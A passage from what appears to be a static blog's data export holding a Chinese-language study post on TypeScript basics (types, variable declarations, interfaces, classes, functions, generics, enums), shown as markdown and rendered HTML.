修饰符。常数枚举不可能有计算成员。\n\n外部枚举用来描述已经存在的枚举类型的形状。外部枚举和非外部枚举之间有一个重要的区别，在正常的枚举里，没有初始化方法的成员被当成常数成员。对于非常数的外部枚举而言，没有初始化方法时被当做需要经过计算的。\n\n# 类型推论 - type inference\n\n当需要从几个表达式中推断类型时候，会使用这些表达式的类型来推断出一个最合适的通用类型。如果没有找到最佳通用类型的话，类型推断的结果为联合数组类型。\n\n# 参考文章\n\n- [优雅的在 vue 中使用 TypeScript](https://zhuanlan.zhihu.com/p/99343202)\n","source":"_posts/2021/06/TypeScript学习记录.md","raw":"---\ntitle: TypeScript学习记录\ndate: 2021-06-22 18:00:00\ntags:\n  - 前端\n  - TypeScript\ncategories:\n  - 前端\n  - TypeScript\n---\n\n按照惯例，先上官方文档\n\n[TypeScript 中文手册](https://typescript.bootcss.com)\n\n<!--more-->\n\n# 基础类型\n\n## 数据类型\n\nTypeScript 支持与 JavaScript 几乎相同的数据类型，此外还提供了实用的枚举类型方便我们使用。\n\n- 布尔值 `boolean`\n- 浮点数 `number`\n  和 JavaScript 一样，TypeScript 里的所有数字都是浮点数\n- 字符串 `string`\n  双引号 `\"\"` 或单引号 `''` 表示，\n  还可使用模板字符串，它可以定义多行文本和内嵌表达式。 这种字符串是被反引号 `` ` `` 包围，并且以 `${ expr }` 这种形式嵌入表达式\n- 数组 `[]` 或数组泛型 `Array<元素类型>`\n- 元组 `Tuple`\n  元组类型允许表示一个已知元素数量和类型的数组，各元素的类型不必相同。\n- 枚举 `enum`\n  枚举类型提供的一个便利是你可以由枚举的值得到它的名字。\n- 任意值 `any`\n  有时候，我们会想要为那些在编程阶段还不清楚类型的变量指定一个类型。 这些值可能来自于动态的内容，比如来自用户输入或第三方代码库。 这种情况下，我们不希望类型检查器对这些值进行检查而是直接让它们通过编译阶段的检查。\n  Object 类型的变量只是允许你给它赋任意值 - 但是却不能够在它上面调用任意的方法，即便它真的有这些方法。\n- 空值 `void`\n  它表示没有任何类型\n- `null` 和 `undefined`\n  `null` 和 `undefined` 两者各自有自己的类型分别叫做 `null` 和 `undefined` 。\n  默认情况下 `null` 和 `undefined` 是所有类型的子类型。\n- `never`\n  表示的是那些永不存在的值的类型。\n  是任何类型的子类型，也可以赋值给任何类型；然而，没有类型是 `never` 的子类型或可以赋值给 `never` 类型（除了 `never` 本身之外）\n\n## 类型断言\n\n类型断言好比其它语言里的类型转换，但是不进行特殊的数据检查和解构。它没有运行时的影响，只是在编译阶段起作用。\n\n- “尖括号”语法 `<变量类型>变量值`\n- `as` 语法 `变量值 as 变量类型`\n\n两种形式是等价的，但当在 TypeScript 里使用 JSX 时，只有 as 语法断言是被允许的。\n\n# 变量声明\n\nlet 和 const 是 JavaScript 里相对较新的变量声明方式。 像我们之前提到过的，let 在很多方面与 var 是相似的，但是可以帮助大家避免在 JavaScript 里常见一些问题。 const 是对 let 的一个增强，它能阻止对一个变量再次赋值。\n\n## `var` 声明\n\n`var` 声明有奇怪的作用域规则，可以在包含它的函数，模块，命名空间或全局作用域内部任何位置被访问，包含它的代码块对此没有什么影响。有些人称此为 var 作用域或函数作用域。函数参数也使用函数作用域。\n\n文档中的例子：\n\n```typescript\nfunction f(shouldInitialize: boolean) {\n  if (shouldInitialize) {\n    var x = 10\n  }\n\n  return x\n}\n\nf(true) // returns '10'\nf(false) // returns 'undefined'\n```\n\n可能引发的错误：\n\n- 多次声明同一个变量并不会报错\n\n  ```typescript\n  // 里层的for循环会覆盖变量i，因为所有i都引用相同的函数作用域内的变量\n  function sumMatrix(matrix: number[][]) {\n    var sum = 0\n    for (var i = 0; i < matrix.length; i++) {\n      var currentRow = matrix[i]\n      for (var i = 0; i < currentRow.length; i++) {\n        sum += currentRow[i]\n      }\n    }\n    return sum\n  }\n  ```\n\n- 变量获取怪异\n\n  ```typescript\n  for (var i = 0; i < 10; i++) {\n    setTimeout(function () {\n      console.log(i)\n    }, 100 * i)\n  }\n  // 期望值： 0 1 2 3 4 5 6 7 8 9\n  // 实际值： 10 10 10 10 10 10 10 10 10 10\n  ```\n\n  `setTimeout` 在若干毫秒后执行一个函数，并且是在 `for` 循环结束后。 `for` 循环结束后，`i` 的值为 `10`。 所以当函数被调用的时候，它会打印出 `10`！\n\n  一个通常的解决方法是使用立即执行的函数表达式（IIFE）来捕获每次迭代时 i 的值：\n\n  ```typescript\n  for (var i = 0; i < 10; i++) {\n    // capture the current state of 'i'\n    // by invoking a function with its current value\n    ;(function (i) {\n      setTimeout(function () {\n        console.log(i)\n      }, 100 * i)\n    })(i)\n  }\n  // 参数i会覆盖for循环里的i，但是因为我们起了同样的名字，所以我们不用怎么改for循环体里的代码。\n  // 输出值： 0 1 2 3 4 5 6 7 8 9\n  ```\n\n## `let` 声明\n\n当用 `let` 声明一个变量，它使用的是词法作用域或块作用域。\n\n- 不同于使用 `var` 声明的变量那样可以在包含它们的函数外访问，块作用域变量在包含它们的块或 `for` 循环之外是不能访问的。\n\n- 拥有块级作用域的变量的另一个特点是，它们不能在被声明之前读或写。虽然这些变量始终“存在”于它们的作用域里，但在直到声明它的代码之前的区域都属于暂时性死区。\n\n- 但我们仍然可以在一个拥有块作用域变量被声明前获取它，只是我们不能在变量声明前去调用那个函数。\n\n使用 `var` 声明同名变量时，不管声明多少次，得到的只有 1 个对象。但 `let` 在一个作用域里的同名变量只能声明一次。\n\n## `const` 声明\n\n拥有与 `let` 声明相同的作用域规则，但给变量声明赋值后不能再重新赋值。\n\n`const` 声明的变量所引用的值是不可变的，但变量的内部状态是可以改变的。\n\nTypeScript 允许将对象的成员设置成只读。\n\n## 解构\n\n- 解构数组\n\n  ```typescript\n  // 相当于使用索引\n  let input = [1, 2]\n  let [first, second] = input\n  console.log(first) // outputs 1\n  console.log(second) // outputs 2\n\n  // 使用...语法创建剩余变量\n  let [first, ...rest] = [1, 2, 3, 4]\n  console.log(first) // outputs 1\n  console.log(rest) // outputs [ 2, 3, 4 ]\n\n  // swap variables\n  ;[first, second] = [second, first]\n  ```\n\n- 解构对象\n\n  ```typescript\n  let o = {\n    a: 'foo',\n    b: 12,\n    c: 'bar',\n  }\n  let { a, b } = o\n\n  // 可以用没有声明的赋值\n  ;({ a, b } = { a: 'baz', b: 101 })\n\n  // 使用...语法创建剩余变量\n  let { a, ...passthrough } = o\n  let total = passthrough.b + passthrough.c.length\n  ```\n\n- 属性重命名\n- 默认值\n\n  ```typescript\n  function keepWholeObject(wholeObject: { a: string; b?: number }) {\n    let { a, b = 1001 } = wholeObject\n  }\n  ```\n\n- 函数声明\n\n  ```typescript\n  // 指定默认值\n  // 首先，需要在默认值之前设置其格式。\n  // 其次，需要在解构属性上给予一个默认或可选的属性用来替换主初始化列表。\n  function f({ a, b = 0 } = { a: '' }): void {\n    // ...\n  }\n  f({ a: 'yes' }) // ok, default b = 0\n  f() // ok, default to {a: \"\"}, which then defaults b = 0\n  f({}) // error, 'a' is required if you supply an argument\n\n  // 解构表达式要尽量保持小而简单\n  ```\n\n## 展开\n\n展开操作符正与解构相反。它允许你将一个数组展开为另一个数组，或将一个对象展开为另一个对象。\n\n```typescript\n// 解构数组\nlet first = [1, 2]\nlet second = [3, 4]\nlet bothPlus = [0, ...first, ...second, 5] // bothPlus = [0, 1, 2, 3, 4, 5]\n\n// 解构对象\nlet defaults = { food: 'spicy', price: '$$', ambiance: 'noisy' }\nlet search = { ...defaults, food: 'rich' } // search = { food: \"rich\", price: \"$$\", ambiance: \"noisy\" }\n```\n\n**注意**\n\n- 对象的展开比数组的展开要复杂的多。像数组展开一样，它是从左至右进行处理，但结果仍为对象。这就意味着出现在展开对象后面的属性会覆盖前面的属性。\n- 对象展开仅包含对象自身的可枚举属性。展开一个对象实例时，会丢失其方法。\n- TypeScript 编译器不允许展开泛型函数上的类型参数。\n\n# 接口 - interface\n\nTypeScript 的核心原则之一是对值所具有的结构进行类型检查。它有时被称做“鸭式辨型法”或“结构性子类型化”。\n\n在 TypeScript 里，接口的作用就是为这些类型命名和为你的代码或第三方代码定义契约。\n\n在调用函数时，传入的对象参数实际上会包含很多属性，但是编译器只会检查那些必需的属性是否存在，并且其类型是否匹配。\n\n## 可选属性\n\n带有可选属性的接口与普通的接口定义差不多，只是在可选属性名字定义的后面加一个 `?` 符号。\n\n可选属性的好处之一是可以对可能存在的属性进行预定义，好处之二是可以捕获引用了不存在的属性时的错误。\n\n## 只读属性\n\n可以在属性名前用 readonly 来指定只读属性。满足对象创建后不能修改属性值的限制。\n\nTypeScript 具有 `ReadonlyArray<T>` 类型，它与 `Array<T>` 相似，只是把所有可变方法去掉了，因此可以确保数组创建后再也不能被修改。\n\n```typescript\nlet a: number[] = [1, 2, 3, 4]\nlet ro: ReadonlyArray<number> = a\nro[0] = 12 // error!\nro.push(5) // error!\nro.length = 100 // error!\na = ro // error!\n\n// 不过可以用类型断言重写\na = ro as number[]\n```\n\n最简单判断该用 readonly 还是 const 的方法是看要把它做为变量使用还是做为一个属性。\n\n做为变量使用的话用 const，若做为属性则使用 readonly。\n\n## 额外的属性检查\n\n对象字面量会被特殊对待而且会经过额外属性检查，当将它们赋值给变量或作为参数传递的时候。如果一个对象字面量存在任何“目标类型”不包含的属性时，你会得到一个错误。\n\n```typescript\ninterface SquareConfig {\n  color?: string\n  width?: number\n}\n\nfunction createSquare(config: SquareConfig): { color: string; area: number } {\n  // ...\n}\n\n// error: 'colour' not expected in type 'SquareConfig'\nlet mySquare = createSquare({ colour: 'red', width: 100 })\n```\n\n绕开这些检查非常简单。最简便的方法是使用类型断言。但最佳的方式是能够添加一个字符串索引签名。最后一种跳过这些检查的方式是将这个对象赋值给一个另一个变量。\n\n```typescript\n// as断言\nlet mySquare = createSquare({ width: 100, opacity: 0.5 } as SquareConfig)\n\n// 如果SquareConfig带有上面定义的类型的color和width属性，并且还会带有任意数量的其它属性，那么我们可以这样定义它\ninterface SquareConfig {\n  color?: string\n  width?: number\n  [propName: string]: any\n}\n\n// 因为squareOptions不会经过额外属性检查，所以编译器不会报错\nlet squareOptions = { colour: 'red', width: 100 }\nlet mySquare = createSquare(squareOptions)\n```\n\n## 函数类型\n\n为了使用接口表示函数类型，我们需要给接口定义一个调用签名。它就像是一个只有参数列表和返回值类型的函数定义。参数列表里的每个参数都需要名字和类型。\n\n对于函数类型的类型检查来说，函数的参数名不需要与接口里定义的名字相匹配。TypeScript 编译器会要求对应位置上的参数类型是兼容的，如果不指定类型，TypeScript 的类型系统会推断出参数类型。\n\n## 可索引的类型\n\n可索引类型具有一个索引签名，它描述了对象索引的类型，还有相应的索引返回值类型。\n\n支持两种索引签名：字符串和数字。 可以同时使用两种类型的索引，但是数字索引的返回值必须是字符串索引返回值类型的子类型。\n\n```typescript\nclass Animal {\n  name: string\n}\nclass Dog extends Animal {\n  breed: string\n}\n\n// 错误：使用'string'索引，有时会得到Animal!\ninterface NotOkay {\n  [x: number]: Animal\n  [x: string]: Dog\n}\n```\n\n字符串索引签名能够很好的描述 `dictionary` 模式，并且它们也会确保所有属性与其返回值类型相匹配。\n\n可以将索引签名设置为只读，这样就防止了给索引赋值。\n\n## 类类型\n\n### `implements` 实现接口\n\n与 C# 或 Java 里接口的基本作用一样，TypeScript 也能够用它来明确的强制一个类去符合某种契约。\n\n也可以在接口中描述一个方法，在类里实现它。接口描述了类的公共部分，而不是公共和私有两部分。它不会帮你检查类是否具有某些私有成员。\n\n### 类静态部分与实例部分的区别\n\n类是具有两个类型的：静态部分的类型和实例的类型。\n\n当一个类实现了一个接口时，只对其实例部分进行类型检查。 constructor 存在于类的静态部分，所以不在检查的范围内。因此，我们应该直接操作类的静态部分。\n\n### `extends` 继承接口\n\n和类一样，接口也可以相互继承。这让我们能够从一个接口里复制成员到另一个接口里，可以更灵活地将接口分割到可重用的模块里，并通过继承多个接口创建合成接口。\n\n## 混合类型\n\n> 不懂\n\n一个例子就是，一个对象可以同时做为函数和对象使用，并带有额外的属性。\n\n```typescript\ninterface Counter {\n  (start: number): string\n  interval: number\n  reset(): void\n}\n\nfunction getCounter(): Counter {\n  let counter = <Counter>function (start: number) {}\n  counter.interval = 123\n  counter.reset = function () {}\n  return counter\n}\n\nlet c = getCounter()\nc(10)\nc.reset()\nc.interval = 5.0\n```\n\n## 接口继承类\n\n当接口继承了一个类类型时，它会继承类的成员但不包括其实现。\n\n接口同样会继承到类的 private 和 protected 成员。 这意味着当你创建了一个接口继承了一个拥有私有或受保护的成员的类时，这个接口类型只能被这个类或其子类所实现（implement）。\n\n# 类\n\n## 继承\n\n类从基类中继承了属性和方法。派生类通常被称作子类，基类通常被称作超类。\n\n派生类在自己的构造函数里必须调用 super()，即基类的构造函数。且访问 this 的属性之前，一定要调用 super()。\n\n## 公共，私有与受保护的修饰符\n\n### `public`\n\n在 TypeScript 里，成员都默认为 `public`\n\n### `private`\n\n不能在声明它的类的外部访问 `private` 成员。\n\n### `protected`\n\n`protected` 成员在派生类中仍然可以访问。\n\n### `readonly` 修饰符\n\n可以使用 `readonly` 关键字将属性设置为只读的。只读属性必须在声明时或构造函数里被初始化。\n\n## 存取器\n\nTypeScript 支持通过 getters/setters 来截取对对象成员的访问。它能帮助你有效的控制对对象成员的访问。\n\n- 存取器要求你将编译器设置为输出 ECMAScript 5 或更高。不支持降级到 ECMAScript 3\n- 只带有 `get` 不带有 `set` 的存取器自动被推断为 `readonly` 。\n\n## 静态属性\n\n用 `static` 定义，这些属性存在于类本身上面而不是类的实例上。\n\n## 抽象类\n\n不同于接口，抽象类可以包含成员的实现细节。 `abstract` 关键字是用于定义抽象类和在抽象类内部定义抽象方法。\n\n抽象类中的抽象方法不包含具体实现并且必须在派生类中实现。\n\n抽象方法必须包含 abstract 关键字并且可以包含访问修饰符。\n\n# 函数 - function\n\n> 在 JavaScript 里，函数可以使用函数体外部的变量。当函数这么做时，我们说它‘捕获’了这些变量。\n> 函数中使用的捕获变量不会体现在类型里。 实际上，这些变量是函数的隐藏状态并不是组成 API 的一部分。\n\n## 函数类型\n\nTypeScript 能够根据返回语句自动推断出返回值类型。\n\n函数类型包含两部分：参数类型和返回值类型。当写出完整函数类型的时候，这两部分都是需要的。函数的类型只是由参数类型和返回值组成的。\n\n- 我们以参数列表的形式写出参数类型，为每个参数指定一个名字和类型。只要参数类型是匹配的，那么就认为它是有效的函数类型，而不在乎参数名是否正确。\n- 对于返回值，我们在函数和返回值类型之前使用(=>)符号，如果函数没有返回任何值，也必须指定返回值类型为 void 而不能留空。\n\n## 函数参数\n\n### 可选参数和默认参数\n\nTypeScript 里的每个函数参数都是必须的。 这是指编译器检查用户是否为每个参数都传入了值，传递给一个函数的参数个数必须与函数期望的参数个数一致。\n\n- JavaScript 里，每个参数都是可选的，可传可不传。 没传参的时候，它的值就是 undefined。\n- 在 TypeScript 里我们可以在参数名旁使用?实现可选参数的功能。可选参数必须跟在必须参数后面。\n\n在 TypeScript 里，我们也可以为参数提供一个默认值当用户没有传递这个参数或传递的值是 undefined 时。 它们叫做有默认初始化值的参数。\n\n与普通可选参数不同的是，带默认值的参数不需要放在必须参数的后面。 如果带默认值的参数出现在必须参数前面，用户必须明确的传入 undefined 值来获得默认值。\n\n### 剩余参数\n\n在 JavaScript 里，你可以使用 arguments 来访问所有传入的参数。\n\n在 TypeScript 里，你可以把所有参数收集到一个变量里，剩余参数会被当做个数不限的可选参数。可以一个都没有，同样也可以有任意个。编译器创建参数数组，名字是你在省略号（...）后面给定的名字，你可以在函数体内使用这个数组。\n\n```typescript\nfunction buildName(firstName: string, ...restOfName: string[]) {\n  return firstName + ' ' + restOfName.join(' ')\n}\n\nlet employeeName = buildName('Joseph', 'Samuel', 'Lucas', 'MacKinzie')\n\nlet buildNameFun: (fname: string, ...rest: string[]) => string = buildName\n```\n\n## `this`\n\nJavaScript 里，`this` 的值在函数被调用的时候才会指定。\n\n当回调函数被调用时，它会被当成一个普通函数调用，`this` 将为 `undefined`，可以通过 `this` 参数来避免错误。\n\n## 重载\n\n为同一个函数提供多个函数类型定义来进行函数重载。\n\n为了让编译器能够选择正确的检查类型，它与 JavaScript 里的处理流程相似。 它查找重载列表，尝试使用第一个重载定义。 如果匹配的话就使用这个。 因此，在定义重载的时候，一定要把最精确的定义放在最前面。\n\n# 泛型 - generic\n\n在像 C#和 Java 这样的语言中，可以使用泛型来创建可重用的组件，一个组件可以支持多种类型的数据。这样用户就可以以自己的数据类型来使用组件。\n\n无法创建泛型枚举和泛型命名空间。\n\nexample：\n\n```typescript\nfunction identity<T>(arg: T): T {\n  return arg\n}\n// 定义了泛型函数后，可以用两种方法使用\n// 第一种是，传入所有的参数，包含类型参数\nlet output = identity<string>('myString') // type of output will be 'string\n// 第二种，利用了类型推论 – 即编译器会根据传入的参数自动地帮助我们确定T的类型\nlet output = identity('myString') // type of output will be 'string'\n```\n\n泛型接口\n\n```typescript\ninterface GenericIdentityFn<T> {\n  (arg: T): T\n}\n\nfunction identity<T>(arg: T): T {\n  return arg\n}\n\nlet myIdentity: GenericIdentityFn<number> = identity\n```\n\n泛型类\n\n泛型类使用（<>）括起泛型类型，跟在类名后面。\n\n```typescript\nclass GenericNumber<T> {\n  zeroValue: T\n  add: (x: T, y: T) => T\n}\n\nlet myGenericNumber = new GenericNumber<number>()\nmyGenericNumber.zeroValue = 0\nmyGenericNumber.add = function (x, y) {\n  return x + y\n}\n```\n\n泛型约束\n\n```typescript\ninterface Lengthwise {\n  length: number\n}\n\nfunction loggingIdentity<T extends Lengthwise>(arg: T): T {\n  console.log(arg.length) // Now we know it has a .length property, so no more error\n  return arg\n}\n\nloggingIdentity(3) // Error, number doesn't have a .length property\n\nloggingIdentity({ length: 10, value: 3 }) // OK\n```\n\n在泛型约束中使用类型参数\n\n可以声明一个类型参数，且它被另一个类型参数所约束。\n\n```typescript\nfunction getProperty<T, K extends keyof T>(obj: T, key: K) {\n  return obj[key]\n}\n\nlet x = { a: 1, b: 2, c: 3, d: 4 }\n\ngetProperty(x, 'a') // okay\ngetProperty(x, 'm') // error: Argument of type 'm' isn't assignable to 'a' | 'b' | 'c' | 'd'.\n```\n\n在泛型里使用类类型\n\n在 TypeScript 使用泛型创建工厂函数时，需要引用构造函数的类类型。\n\n```typescript\nclass BeeKeeper {\n  hasMask: boolean\n}\n\nclass ZooKeeper {\n  nametag: string\n}\n\nclass Animal {\n  numLegs: number\n}\n\nclass Bee extends Animal {\n  keeper: BeeKeeper\n}\n\nclass Lion extends Animal {\n  keeper: ZooKeeper\n}\n\nfunction createInstance<A extends Animal>(c: new () => A): A {\n  return new c()\n}\n\ncreateInstance(Lion).keeper.nametag // typechecks!\ncreateInstance(Bee).keeper.hasMask // typechecks!\n```\n\n# 枚举 - enum\n\n使用枚举我们可以定义一些有名字的数字常量。枚举通过 `enum` 关键字来定义。\n\n枚举是在运行时真正存在的一个对象。其中一个原因是因为这样可以从枚举值到枚举名进行反向映射。生成的代码中，枚举类型被编译成一个对象，它包含双向映射（name -> value）和（value -> name）。 引用枚举成员总会生成一次属性访问并且永远不会内联。\n\n当访问枚举值时，为了避免生成多余的代码和间接引用，可以使用常数枚举，在 `enum` 关键字前使用 `const` 修饰符。常数枚举不可能有计算成员。\n\n外部枚举用来描述已经存在的枚举类型的形状。外部枚举和非外部枚举之间有一个重要的区别，在正常的枚举里，没有初始化方法的成员被当成常数成员。对于非常数的外部枚举而言，没有初始化方法时被当做需要经过计算的。\n\n# 类型推论 - type inference\n\n当需要从几个表达式中推断类型时候，会使用这些表达式的类型来推断出一个最合适的通用类型。如果没有找到最佳通用类型的话，类型推断的结果为联合数组类型。\n\n# 参考文章\n\n- [优雅的在 vue 中使用 TypeScript](https://zhuanlan.zhihu.com/p/99343202)\n","slug":"2021/06/TypeScript学习记录","published":1,"updated":"2022-09-26T15:04:17.696Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clyh3xciz000ezge3d34v421x","content":"<p>按照惯例，先上官方文档</p>\n<p><a href=\"https://typescript.bootcss.com/\">TypeScript 中文手册</a></p>\n<span id=\"more\"></span>\n\n<h1 id=\"基础类型\"><a href=\"#基础类型\" class=\"headerlink\" title=\"基础类型\"></a>基础类型</h1><h2 id=\"数据类型\"><a href=\"#数据类型\" class=\"headerlink\" title=\"数据类型\"></a>数据类型</h2><p>TypeScript 支持与 JavaScript 几乎相同的数据类型，此外还提供了实用的枚举类型方便我们使用。</p>\n<ul>\n<li>布尔值 <code>boolean</code></li>\n<li>浮点数 <code>number</code><br>和 JavaScript 一样，TypeScript 里的所有数字都是浮点数</li>\n<li>字符串 <code>string</code><br>双引号 <code>&quot;&quot;</code> 或单引号 <code>&#39;&#39;</code> 表示，<br>还可使用模板字符串，它可以定义多行文本和内嵌表达式。 这种字符串是被反引号 <code>`</code> 包围，并且以 <code>$&#123; expr &#125;</code> 这种形式嵌入表达式</li>\n<li>数组 <code>[]</code> 或数组泛型 <code>Array&lt;元素类型&gt;</code></li>\n<li>元组 <code>Tuple</code><br>元组类型允许表示一个已知元素数量和类型的数组，各元素的类型不必相同。</li>\n<li>枚举 <code>enum</code><br>枚举类型提供的一个便利是你可以由枚举的值得到它的名字。</li>\n<li>任意值 <code>any</code><br>有时候，我们会想要为那些在编程阶段还不清楚类型的变量指定一个类型。 这些值可能来自于动态的内容，比如来自用户输入或第三方代码库。 这种情况下，我们不希望类型检查器对这些值进行检查而是直接让它们通过编译阶段的检查。<br>Object 类型的变量只是允许你给它赋任意值 - 但是却不能够在它上面调用任意的方法，即便它真的有这些方法。</li>\n<li>空值 <code>void</code><br>它表示没有任何类型</li>\n<li><code>null</code> 和 <code>undefined</code><br><code>null</code> 和 <code>undefined</code> 两者各自有自己的类型分别叫做 <code>null</code> 和 <code>undefined</code> 。<br>默认情况下 <code>null</code> 和 <code>undefined</code> 是所有类型的子类型。</li>\n<li><code>never</code><br>表示的是那些永不存在的值的类型。<br>是任何类型的子类型，也可以赋值给任何类型；然而，没有类型是 <code>never</code> 的子类型或可以赋值给 <code>never</code> 类型（除了 <code>never</code> 本身之外）</li>\n</ul>\n<h2 id=\"类型断言\"><a href=\"#类型断言\" class=\"headerlink\" title=\"类型断言\"></a>类型断言</h2><p>类型断言好比其它语言里的类型转换，但是不进行特殊的数据检查和解构。它没有运行时的影响，只是在编译阶段起作用。</p>\n<ul>\n<li>“尖括号”语法 <code>&lt;变量类型&gt;变量值</code></li>\n<li><code>as</code> 语法 <code>变量值 as 变量类型</code></li>\n</ul>\n<p>两种形式是等价的，但当在 TypeScript 里使用 JSX 时，只有 as 语法断言是被允许的。</p>\n<h1 id=\"变量声明\"><a href=\"#变量声明\" class=\"headerlink\" title=\"变量声明\"></a>变量声明</h1><p>let 和 const 是 JavaScript 里相对较新的变量声明方式。 像我们之前提到过的，let 在很多方面与 var 是相似的，但是可以帮助大家避免在 JavaScript 里常见一些问题。 const 是对 let 的一个增强，它能阻止对一个变量再次赋值。</p>\n<h2 id=\"var-声明\"><a href=\"#var-声明\" class=\"headerlink\" title=\"var 声明\"></a><code>var</code> 声明</h2><p><code>var</code> 声明有奇怪的作用域规则，可以在包含它的函数，模块，命名空间或全局作用域内部任何位置被访问，包含它的代码块对此没有什么影响。有些人称此为 var 作用域或函数作用域。函数参数也使用函数作用域。</p>\n<p>文档中的例子：</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">f</span>(<span class=\"params\">shouldInitialize: <span class=\"built_in\">boolean</span></span>) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (shouldInitialize) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> x = <span class=\"number\">10</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> x</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_\">f</span>(<span class=\"literal\">true</span>) <span class=\"comment\">// returns &#x27;10&#x27;</span></span><br><span class=\"line\"><span class=\"title function_\">f</span>(<span class=\"literal\">false</span>) <span class=\"comment\">// returns &#x27;undefined&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>可能引发的错误：</p>\n<ul>\n<li><p>多次声明同一个变量并不会报错</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 里层的for循环会覆盖变量i，因为所有i都引用相同的函数作用域内的变量</span></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">sumMatrix</span>(<span class=\"params\">matrix: <span class=\"built_in\">number</span>[][]</span>) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> sum = <span class=\"number\">0</span></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; matrix.<span class=\"property\">length</span>; i++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> currentRow = matrix[i]</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; currentRow.<span class=\"property\">length</span>; i++) &#123;</span><br><span class=\"line\">      sum += currentRow[i]</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> sum</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>变量获取怪异</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; i++) &#123;</span><br><span class=\"line\">  <span class=\"built_in\">setTimeout</span>(<span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(i)</span><br><span class=\"line\">  &#125;, <span class=\"number\">100</span> * i)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 期望值： 0 1 2 3 4 5 6 7 8 9</span></span><br><span class=\"line\"><span class=\"comment\">// 实际值： 10 10 10 10 10 10 10 10 10 10</span></span><br></pre></td></tr></table></figure>\n\n<p><code>setTimeout</code> 在若干毫秒后执行一个函数，并且是在 <code>for</code> 循环结束后。 <code>for</code> 循环结束后，<code>i</code> 的值为 <code>10</code>。 所以当函数被调用的时候，它会打印出 <code>10</code>！</p>\n<p>一个通常的解决方法是使用立即执行的函数表达式（IIFE）来捕获每次迭代时 i 的值：</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; i++) &#123;</span><br><span class=\"line\">  <span class=\"comment\">// capture the current state of &#x27;i&#x27;</span></span><br><span class=\"line\">  <span class=\"comment\">// by invoking a function with its current value</span></span><br><span class=\"line\">  ;(<span class=\"keyword\">function</span> (<span class=\"params\">i</span>) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">setTimeout</span>(<span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">      <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(i)</span><br><span class=\"line\">    &#125;, <span class=\"number\">100</span> * i)</span><br><span class=\"line\">  &#125;)(i)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 参数i会覆盖for循环里的i，但是因为我们起了同样的名字，所以我们不用怎么改for循环体里的代码。</span></span><br><span class=\"line\"><span class=\"comment\">// 输出值： 0 1 2 3 4 5 6 7 8 9</span></span><br></pre></td></tr></table></figure></li>\n</ul>\n<h2 id=\"let-声明\"><a href=\"#let-声明\" class=\"headerlink\" title=\"let 声明\"></a><code>let</code> 声明</h2><p>当用 <code>let</code> 声明一个变量，它使用的是词法作用域或块作用域。</p>\n<ul>\n<li><p>不同于使用 <code>var</code> 声明的变量那样可以在包含它们的函数外访问，块作用域变量在包含它们的块或 <code>for</code> 循环之外是不能访问的。</p>\n</li>\n<li><p>拥有块级作用域的变量的另一个特点是，它们不能在被声明之前读或写。虽然这些变量始终“存在”于它们的作用域里，但在直到声明它的代码之前的区域都属于暂时性死区。</p>\n</li>\n<li><p>但我们仍然可以在一个拥有块作用域变量被声明前获取它，只是我们不能在变量声明前去调用那个函数。</p>\n</li>\n</ul>\n<p>使用 <code>var</code> 声明同名变量时，不管声明多少次，得到的只有 1 